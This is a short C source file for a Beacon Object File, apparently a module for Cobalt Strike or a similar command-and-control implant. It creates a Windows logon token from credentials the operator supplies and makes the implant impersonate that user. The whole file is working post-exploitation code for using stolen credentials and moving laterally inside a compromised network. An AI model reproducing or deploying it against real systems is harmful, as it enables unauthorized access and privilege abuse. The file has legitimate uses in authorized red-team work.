#include <windows.h>
#include "../_include/beacon.h"

WINBASEAPI WINBOOL WINAPI ADVAPI32$LogonUserW( LPCWSTR lpszUsername, LPCWSTR lpszDomain, LPCWSTR lpszPassword, DWORD dwLogonType, DWORD dwLogonProvider, PHANDLE phToken );
WINBASEAPI DWORD   WINAPI KERNEL32$GetLastError(VOID);

VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    WCHAR* username   = BeaconDataExtract(&parser, NULL);
    WCHAR* password   = BeaconDataExtract(&parser, NULL);
    WCHAR* domain     = BeaconDataExtract(&parser, NULL);
    ULONG  token_type = BeaconDataInt(&parser);
    ULONG  logon_provider = 0;

    if( !username || !password || !domain )
        return;

    if ( 1 < token_type && token_type < 6 || token_type == 8 ) {
        logon_provider = LOGON32_PROVIDER_WINNT50;
    }
    else {
        token_type     = LOGON32_LOGON_NEW_CREDENTIALS;
        logon_provider = LOGON32_PROVIDER_WINNT50;
    }

    HANDLE hToken = NULL;
    if ( ADVAPI32$LogonUserW( username, domain, password, token_type, logon_provider, &hToken ) ) {
        if( BeaconUseToken(hToken) )
            BeaconPrintf(CALLBACK_OUTPUT, "The user impersonated successfully.\n");
        else
            BeaconPrintf(CALLBACK_ERROR, "Failed to impersonate user. Error: %d\n", KERNEL32$GetLastError());
    }
    else BeaconPrintf(CALLBACK_ERROR, "Failed to create token. Error: %d\n", KERNEL32$GetLastError());
}
